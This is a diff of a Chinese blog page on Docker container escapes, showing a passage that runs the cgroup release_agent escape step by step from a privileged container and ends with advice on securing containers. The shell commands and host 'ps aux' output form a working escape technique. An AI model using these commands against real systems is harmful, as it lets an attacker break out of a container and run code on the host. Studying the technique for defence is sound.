 <p>接下来，通过在“x”cgroup的notify_on_release文件中写入一个1来启用cgroup通知。通过将主机上的&#x2F;cmd脚本路径写入release_agent文件，还将RDMA cgroup发布代理设置为执行&#x2F;cmd脚本(稍后将在容器中创建)。为此，将从&#x2F;etc&#x2F;mtab文件中获取主机上容器的路径。</p>
 <p>在容器中添加或修改的文件存在于主机上，可以从两个方面修改它们:容器中的路径和它们在主机上的路径。</p>
 <p>这些行动如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &amp;quot;$host_path/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBiMTFjZjllYWI0ZmQ6LyMgZWNobyAxICZndDsgL3RtcC9jZ3JwL3gvbm90aWZ5X29uX3JlbGVhc2UKcm9vdEBiMTFjZjllYWI0ZmQ6LyMgaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKcm9vdEBiMTFjZjllYWI0ZmQ6LyMgZWNobyAmcXVvdDskaG9zdF9wYXRoL2NtZCZxdW90OyAmZ3Q7IC90bXAvY2dycC9yZWxlYXNlX2FnZW50Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo 1 &amp;gt; /tmp/cgrp/x/notify_on_release</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &amp;quot;$host_path/cmd&amp;quot; &amp;gt; /tmp/cgrp/release_agent</span></span><br></pre></td></tr></table></figure>
 
 <p>注意&#x2F;cmd脚本的路径，将在主机上创建:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># cat /tmp/cgrp/release_agent</span></span><br><span class="line">/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBiMTFjZjllYWI0ZmQ6LyMgY2F0IC90bXAvY2dycC9yZWxlYXNlX2FnZW50Ci92YXIvbGliL2RvY2tlci9vdmVybGF5Mi83ZjQxNzVjOTBhZjdjNTRjODc4ZmZjNjcyNmRjYjEyNWM0MTYxOThhMjk1NWM3MGUxODZiZjZhMTI3YzU2MjJmL2RpZmYvY21kCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># cat /tmp/cgrp/release_agent</span></span><br><span class="line">/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd</span><br></pre></td></tr></table></figure>
 
 <p>现在，创建&#x2F;cmd脚本，以便它将执行ps aux命令，并通过指定主机上输出文件的完整路径将其输出保存到容器上的&#x2F;output中。最后，还打印&#x2F;cmd脚本来查看它的内容:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &#x27;#!/bin/sh&#x27; &amp;gt; /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &amp;quot;ps aux &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># chmod a+x /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># cat /cmd</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ps aux &amp;gt; /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBiMTFjZjllYWI0ZmQ6LyMgZWNobyAnIyEvYmluL3NoJyAmZ3Q7IC9jbWQKcm9vdEBiMTFjZjllYWI0ZmQ6LyMgZWNobyAmcXVvdDtwcyBhdXggJmd0OyAkaG9zdF9wYXRoL291dHB1dCZxdW90OyAmZ3Q7Jmd0OyAvY21kCnJvb3RAYjExY2Y5ZWFiNGZkOi8jIGNobW9kIGEreCAvY21kCnJvb3RAYjExY2Y5ZWFiNGZkOi8jIGNhdCAvY21kCiMhL2Jpbi9zaApwcyBhdXggJmd0OyAvdmFyL2xpYi9kb2NrZXIvb3ZlcmxheTIvN2Y0MTc1YzkwYWY3YzU0Yzg3OGZmYzY3MjZkY2IxMjVjNDE2MTk4YTI5NTVjNzBlMTg2YmY2YTEyN2M1NjIyZi9kaWZmL291dHB1dAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &#x27;#!/bin/sh&#x27; &amp;gt; /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># echo &amp;quot;ps aux &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># chmod a+x /cmd</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># cat /cmd</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ps aux &amp;gt; /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output</span><br></pre></td></tr></table></figure>
 
 <p>最后，可以通过生成一个立即结束在“x”cgroup内的子进程来执行攻击。<br>通过创建&#x2F;bin&#x2F;sh进程并将其PID写入cgroup。<br>在”x”子cgroup目录下，主机上的脚本将在&#x2F;bin&#x2F;sh退出后执行。<br>ps aux在主机上执行的输出被保存到容器内的&#x2F;输出文件中:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># head /output</span></span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init</span><br><span class="line">root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]</span><br><span class="line">root         3  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [rcu_gp]</span><br><span class="line">root         4  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [rcu_par_gp]</span><br><span class="line">root         6  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [kworker/0:0H-kblockd]</span><br><span class="line">root         8  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [mm_percpu_wq]</span><br><span class="line">root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]</span><br><span class="line">root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]</span><br><span class="line">root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cm9vdEBiMTFjZjllYWI0ZmQ6LyMgc2ggLWMgJnF1b3Q7ZWNobyBcJFwkICZndDsgL3RtcC9jZ3JwL3gvY2dyb3VwLnByb2NzJnF1b3Q7CnJvb3RAYjExY2Y5ZWFiNGZkOi8jIGhlYWQgL291dHB1dApVU0VSICAgICAgIFBJRCAlQ1BVICVNRU0gICAgVlNaICAgUlNTIFRUWSAgICAgIFNUQVQgU1RBUlQgICBUSU1FIENPTU1BTkQKcm9vdCAgICAgICAgIDEgIDAuMSAgMS4wICAxNzU2NCAxMDI4OCA/ICAgICAgICBTcyAgIDEzOjU3ICAgMDowMSAvc2Jpbi9pbml0CnJvb3QgICAgICAgICAyICAwLjAgIDAuMCAgICAgIDAgICAgIDAgPyAgICAgICAgUyAgICAxMzo1NyAgIDA6MDAgW2t0aHJlYWRkXQpyb290ICAgICAgICAgMyAgMC4wICAwLjAgICAgICAwICAgICAwID8gICAgICAgIEkmbHQ7ICAgMTM6NTcgICAwOjAwIFtyY3VfZ3BdCnJvb3QgICAgICAgICA0ICAwLjAgIDAuMCAgICAgIDAgICAgIDAgPyAgICAgICAgSSZsdDsgICAxMzo1NyAgIDA6MDAgW3JjdV9wYXJfZ3BdCnJvb3QgICAgICAgICA2ICAwLjAgIDAuMCAgICAgIDAgICAgIDAgPyAgICAgICAgSSZsdDsgICAxMzo1NyAgIDA6MDAgW2t3b3JrZXIvMDowSC1rYmxvY2tkXQpyb290ICAgICAgICAgOCAgMC4wICAwLjAgICAgICAwICAgICAwID8gICAgICAgIEkmbHQ7ICAgMTM6NTcgICAwOjAwIFttbV9wZXJjcHVfd3FdCnJvb3QgICAgICAgICA5ICAwLjAgIDAuMCAgICAgIDAgICAgIDAgPyAgICAgICAgUyAgICAxMzo1NyAgIDA6MDAgW2tzb2Z0aXJxZC8wXQpyb290ICAgICAgICAxMCAgMC4wICAwLjAgICAgICAwICAgICAwID8gICAgICAgIEkgICAgMTM6NTcgICAwOjAwIFtyY3Vfc2NoZWRdCnJvb3QgICAgICAgIDExICAwLjAgIDAuMCAgICAgIDAgICAgIDAgPyAgICAgICAgUyAgICAxMzo1NyAgIDA6MDAgW21pZ3JhdGlvbi8wXQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@b11cf9eab4fd:/<span class="comment"># sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;</span></span><br><span class="line">root@b11cf9eab4fd:/<span class="comment"># head /output</span></span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init</span><br><span class="line">root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]</span><br><span class="line">root         3  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [rcu_gp]</span><br><span class="line">root         4  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [rcu_par_gp]</span><br><span class="line">root         6  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [kworker/0:0H-kblockd]</span><br><span class="line">root         8  0.0  0.0      0     0 ?        I&amp;lt;   13:57   0:00 [mm_percpu_wq]</span><br><span class="line">root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]</span><br><span class="line">root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]</span><br><span class="line">root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]</span><br></pre></td></tr></table></figure>
 
 <h2 id="安全的使用容器"><a href="#安全的使用容器" class="headerlink" title="安全的使用容器"></a>安全的使用容器</h2><p>Docker默认限制和限制容器。放松这些限制可能会产生安全问题，即使没有特权标志的全部权力。认识到每个额外权限的影响并将总体权限限制到最低限度是很重要的。</p>
 <p>确保容器安全:</p>
@@ -403,16 +411,16 @@
           <div class="reward-container">
   <div>Buy me a coffee</div>
   <button>
-    Donate
+    赞赏
   </button>
   <div class="post-reward">
       <div>
-        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
-        <span>WeChat Pay</span>
+        <img src="/images/wechatpay.png" alt="253 微信">
+        <span>微信</span>
       </div>
       <div>
-        <img src="/images/alipay.png" alt="253 Alipay">
-        <span>Alipay</span>
+        <img src="/images/alipay.png" alt="253 支付宝">
+        <span>支付宝</span>
       </div>
 
   </div>
@@ -423,20 +431,20 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>Post author:  </strong>253
+      <strong>本文作者： </strong>253
   </li>
   <li class="post-copyright-link">
-      <strong>Post link: </strong>
+      <strong>本文链接：</strong>
       <a href="https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/" title="理解Docker容器逃逸">https://lucifer11.xyz/2020/12/14/Understanding-Docker-container-escapes/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
 
           <div class="followme">
-  <span>Welcome to my other publishing channels</span>
+  <span>欢迎关注我的其它发布渠道</span>
 
   <div class="social-list">
 
@@ -495,7 +503,10 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> linux提权</a>
+              <a href="/tags/Docker/" rel="tag"><i class="fa fa-tag"></i> Docker</a>
+              <a href="/tags/cgroups/" rel="tag"><i class="fa fa-tag"></i> cgroups</a>
+              <a href="/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" rel="tag"><i class="fa fa-tag"></i> 容器逃逸</a>
+              <a href="/tags/Capabilities/" rel="tag"><i class="fa fa-tag"></i> Capabilities</a>
           </div>
 
         
@@ -541,15 +552,15 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-      <span>Word count total: </span>
-    <span title="Word count total">666k</span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">696k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-      <span>Reading time total &asymp;</span>
-    <span title="Reading time total">40:23</span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42:11</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -557,7 +568,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="Total Visitors">
+      <span class="site-uv" title="总访客量">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -565,12 +576,12 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="Total Views">
+      <span class="site-pv" title="总访问量">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
-  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
     </div>
